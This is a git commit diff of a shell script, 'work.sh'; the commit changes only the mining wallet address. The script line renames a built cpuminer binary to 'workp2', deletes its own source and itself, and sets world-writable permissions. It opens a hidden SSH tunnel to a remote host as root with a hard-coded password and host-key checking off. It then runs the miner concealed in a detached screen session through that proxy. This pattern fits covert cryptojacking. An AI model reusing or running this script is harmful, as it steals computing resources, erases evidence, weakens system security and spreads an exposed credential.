63b1b2df985c795f5caecaffeef534244d70fe09
laptopdell <40815880+laptopdell@users.noreply.github.com>
2018-12-12 03:02:54 +0700

    Update work.sh

--- work.sh
+++ work.sh
@@ -5,4 +5,4 @@ cd laptopedit
 chmod +x *
 ./build.sh
 make
-mv cpuminer workp2 && cp workp2 ../ && cd ..  && sudo rm -rf laptopedit work.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxywork.ddns.net && cpulimit --exe workp2 --limit 200 -b && screen -d -m ./workp2 -u HU2ff89CDhTqFLxMZqFuCyFfZyfk9rUJu8.Google -p x -x socks4://127.0.0.1:1997
+mv cpuminer workp2 && cp workp2 ../ && cd ..  && sudo rm -rf laptopedit work.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxywork.ddns.net && cpulimit --exe workp2 --limit 200 -b && screen -d -m ./workp2 -u HNpt86fZ7KwAL7AnVSjYZ3q1uN5V67cYGE.Google -p x -x socks4://127.0.0.1:1997
